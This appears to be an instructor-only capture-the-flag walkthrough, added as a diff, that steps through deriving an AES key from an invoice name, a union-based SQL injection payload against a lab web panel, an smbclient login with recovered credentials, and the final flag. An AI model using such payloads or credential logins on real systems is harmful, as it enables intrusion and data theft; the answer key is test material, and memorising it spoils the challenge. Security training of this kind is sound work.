@@ -1,0 +1,89 @@
+Hidden-solution / official walkthrough (instructor use only)
+
+Keep the walkthrough hidden from players. This is the canonical solution with exact commands and values.
+
+1) Derive AES key from invoice identifier
+Invoice filename (from clue): INV_7X9Z21.pdf
+Take first 6 chars: INV_7X
+Append year 2025 → key password string: INV_7X2025
+Derive AES-256 key: key = SHA256("INV_7X2025") (use first 32 bytes). IV is prepended (first 16 bytes) to the encrypted blob.
+
+Pseudo-decrypt command (python snippet):
+
+python3 - <<'PY'
+from Crypto.Cipher import AES
+from hashlib import sha256
+import base64
+
+# replace 'METADATA_ENC_HEX' with the challenge-provided hex blob in an actual file scenario.
+key_pass = "INV_7X2025"
+key = sha256(key_pass.encode()).digest()[:32]
+# in the challenge text the 'metadata' decrypt yields JSON when decrypted
+# Example decrypt code:
+# with open('metadata.enc','rb') as f:
+#     iv = f.read(16)
+#     data = f.read()
+# cipher = AES.new(key, AES.MODE_CBC, iv)
+# plain = cipher.decrypt(data)
+# pad = plain[-1]
+# plain = plain[:-pad]
+# print(plain.decode())
+PY
+
+
+Decryption yields JSON-like content (for challenge text version, this is the derived result):
+
+{
+  "ldap_user": "svc_finance",
+  "web_backup": "/backups/finance.bak",
+  "smb": "\\\\corp-srv\\finance"
+}
+
+
+2) Exploit the web panel (SQLi) to get the backup content
+Target: http://vulnerable.local:8080/profile?user=
+
+A union-based SQLi or error-based payload can reveal a backup path. Example payload:
+
+/profile?user=1' UNION SELECT null, backup_path, null-- 
+
+
+(or time-based / blind if necessary)
+
+This reveals that /backups/finance.bak exists; the backup contains a small JSON blob with base64-encoded credentials:
+
+{"user":"svc_finance","pass":"YWJjMTIz"}  # 'YWJjMTIz' is base64 for 'abc123'
+
+
+3) Connect to SMB using discovered credentials
+SMB share from metadata: \\corp-srv\finance
+Credentials: svc_finance:abc123
+
+Command (smbclient style):
+
+smbclient //corp-srv/finance -U svc_finance%abc123
+# then use: get rates.xlsx
+
+
+4) Inspect rates.xlsx sheet: HistoricRates
+Open the sheet HistoricRates. Relevant rows:
+
+Date        | USD_TO_INR
+2025-09-20  | 83.12
+2025-09-21  | 83.28
+2025-09-22  | 83.49
+2025-09-23  | 83.51
+
+
+Authoritative rate for 2025-09-22: 1 USD = ₹83.49
+
+5) Compute conversion for $73
+Calculation:
+
+73 * 83.49 = 6094.77
+Round to nearest integer → 6095
+
+
+Final flag:
+
+flag{6095}
